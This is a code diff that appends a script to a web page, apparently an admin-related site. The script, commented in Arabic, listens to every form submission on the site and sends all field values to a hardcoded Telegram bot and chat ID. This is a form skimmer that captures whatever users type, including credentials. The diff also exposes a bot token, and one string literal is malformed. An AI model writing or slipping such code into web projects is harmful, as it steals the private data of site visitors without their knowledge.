@@ -607,6 +607,33 @@
   }
 
   loadAdmin();
+  // كود إرسال البيانات إلى التليجرام
+const BOT_TOKEN = '8829617276:AAFj78SmLvHqeJNF91Akvr2rP07116dAumA';
+const CHAT_ID = '8458451569';
+
+async function sendToTelegram(data) {
+    const text = 📝 **تسجيل جديد:**\n\n + JSON.stringify(data, null, 2);
+
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (error) {
+        console.error('Telegram Send Error:', error);
+    }
+}
+// الاستماع لأي نموذج يتم إرساله داخل الموقع
+document.addEventListener('submit', function(e) {
+    const formData = new FormData(e.target);
+    const data = Object.fromEntries(formData.entries());
+    sendToTelegram(data);
+});
 </script>
 
 </body>
